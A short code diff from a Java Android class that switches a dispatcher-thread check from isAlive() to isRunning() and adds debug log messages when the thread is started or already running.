@@ -375,8 +375,15 @@ public class Core extends Activity implements Runnable {
 			// Start log dispatcher
 			final EvDispatcher logDispatcher = EvDispatcher.self();
 
-			if (!logDispatcher.isAlive()) {
+			if (!logDispatcher.isRunning()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (taskInit), start evDispatcher");
+				}
 				logDispatcher.start();
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (taskInit), evDispatcher already started ");
+				}
 			}
 
 			// Da qui in poi inizia la concorrenza dei thread
